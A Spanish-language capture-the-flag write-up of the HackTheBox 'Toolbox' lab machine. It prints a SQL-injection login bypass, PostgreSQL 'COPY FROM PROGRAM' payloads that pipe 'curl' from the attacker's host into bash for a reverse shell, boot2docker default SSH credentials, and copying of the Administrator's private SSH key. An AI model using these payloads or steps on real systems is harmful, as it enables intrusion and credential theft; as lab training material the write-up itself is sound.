---
title: HTB - Toolbox
published: true
categories: [Windows]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Fácil]
---


<img src="/assets/HTB/Toolbox/toolbox.png">


¡Hola!
Vamos a resolver de la máquina `Toolbox` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **PostgreSQL Injection (RCE)**
- **Abusing boot2docker [Docker-Toolbox]**
- **Pivoting**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Toolbox`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento 

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.236
PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data.
64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.10.236 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.236 -oG allPorts

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.236 -oN targeted

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_http-title: Administrator Login
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Agregamos `admin.megalogistic.com` a nuestro `/etc/hosts`

### Reconocimiento FTP

* * *

Examinando los resultados de nmap observamos que podemos acceder de forma anónima a la máquina por FTP

```bash
❯ ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:yorch): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> dir
200 Port command successful
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
```
Encontramos un ejecutable de windows `docker-toolbox.exe` el cual proporciona una forma de utilizar Docker en sistemas Windows antiguos que no cumplen con los requisitos mínimos del sistema para la aplicación Docker para Windows. El componente principal de Docker requiere un sistema operativo Linux para poderse ejecutar

Seguimos con el reconocimiento Web

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb https://10.10.10.236
https://10.10.10.236 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.10.236], JQuery[3.3.1], Script, Title[MegaLogistics]
```

Accedemos al servicio web por el puerto 443 dónde vemos una página de un servicio logístico aparentemente con poca funcionalidad y accediendo al dominio `admin.megalogistic.com` localizamos un panel de login

<img src="/assets/HTB/Toolbox/main.png">
<img src="/assets/HTB/Toolbox/admin.png">

Empezamos reconociendo el panel de login encontrado. Aplicando guessing con contraseñas típicas por defecto no nos lleva a ningún lado. Probamos a inyectar `admin' or 1=1-- -` y logramos saltarnos el panel de login

<img src="/assets/HTB/Toolbox/login.png">

Sabemos que el panel de login es vulnerable a inyecciones SQL, interceptamos con `BurpSuite` y tras probar varios formatos damos con que ejecutando `pg_sleep(10)` la web tarda 10 segundos en reaccionar lo que nos lleva a la conclusión que estamos ante `PostgreSQL`

<img src="/assets/HTB/Toolbox/burp.png">

Revisando payloads en  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md) encontramos una posible vía para llegar a un RCE. Ejecutamos paso a paso tal cual nos indican

```sql
username=admin';DROP TABLE IF EXISTS cmd_exec;-- -;&password=admin
```

```sql
username=admin';CREATE TABLE cmd_exec(cmd_output text);-- -;&password=admin
```
En lugar de tratar de ejecutar el comando `id` probamos a hacer un curl a un servidor HTTP que levantaremos en nuestra máquina atacante

```sql
username=admin';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.73|test';-- -;&password=admin
```
Vemos que llega la petición al servidor HTTP

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.96.171 - - [26/Nov/2022 16:35:58] "GET / HTTP/1.1" 200 -
```

Creamos un archivo `index.html` el cual contiene un oneliner para entablar una reverse shell en nuestro equipo, nos ponemos en escucha en el puerto 443 y ejecutamos nuevamente la inyección con el curl con un pipe para que interprete bash

```sql
username=admin';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.73|bash';-- -;&password=admin
```

<img src="/assets/HTB/Toolbox/revshell.png">

Hemos logrado acceso a la máquina víctima

### Escalada Privilegios

* * *

Verificamos con `hostname -I` que nos encontramos dentro de un contenedor

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 4650  bytes 689344 (673.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3704  bytes 2959735 (2.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12324  bytes 4250228 (4.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12324  bytes 4250228 (4.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Docker Toolbox usa VirtualBox para correr una VM que contiene el contenedor. Esto se consigue usando [Boot2Docker](https://github.com/boot2docker/boot2docker#ssh-into-vm). Mirando la documentación encontramos credenciales por defecto `docker / tcuser` para conectarte por ssh al host

<img src="/assets/HTB/Toolbox/ssh.png">

Saviendo que la IP del contenedor donde nos econtramos es `172.17.0.2` podemos dedeucir que la IP del host de VM es `172.17.0.1`. Vamos a probar a conectarnos por SSH usando las credenciales por defecto

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$
```

Nos convertimos en root y con una búsqueda recursiva desde la raíz localizamos la flag de usuario

```bash
docker@box:/$ sudo su                                                                                                                                                                     
root@box:/# find / -name user.txt 2>/dev/null  
/mnt/sda1/var/lib/docker/overlay2/07623502c61c6209351069a7c272a5514f193c50302d83ead62325346bf41d06/merged/var/lib/postgresql/user.txt
/mnt/sda1/var/lib/docker/overlay2/20aed3bef7110c6e08a7fc7f476fcdf690589baabf19f49b462b7395724731d2/diff/var/lib/postgresql/user.txt
root@box:/# cat /mnt/sda1/var/lib/docker/overlay2/07623502c61c6209351069a7c272a5514f193c50302d83ead62325346bf41d06/merged/var/lib/postgresql/user.txt                                     
f0183e44378ea9774***************  flag.txt
```

De acuerdo a la documentación, docker-toolbox tiene acceso al directorio `C:\Users` por defecto el cual está montado en `/c/users`

```bash
docker@box:~$ cd /c/Users                                                                                                                                                                 
docker@box:/c/Users$ ls                                                                                                                                                                   
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
```

En la carpeta Administrator encontramos un directorio `.ssh` que contiene una clave `id_rsa` 

```bash
docker@box:/c/Users/Administrator/.ssh$ ls -la                                                                                                                                            
total 18
drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 ..
-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 authorized_keys
-rwxrwxrwx    1 docker   staff         1675 Feb 19  2020 id_rsa
-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 id_rsa.pub
-rwxrwxrwx    1 docker   staff          348 Feb 19  2020 known_hosts
```

Nos copiamos la clave en nuestro equipo, le damos permisos 600 y nos logueamos como Administrator

```bash
ssh -i id_rsa administrator@10.10.10.236 

Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@TOOLBOX C:\Users\Administrator>whoami
toolbox\administrator
```

Buscamos desde la raíz de forma recursiva por el archivo `root.txt` y lo localizamos en el escritorio del usuario administartor

```bash
#ROOT
administrator@TOOLBOX C:\>dir /b/s root.txt 
C:\Documents and Settings\Administrator\Desktop\root.txt 
administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt 
cc9a0b76ac17f8f47***************
```

Hemos completado la máquina **Toolbox** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Toolbox/pwned.png">
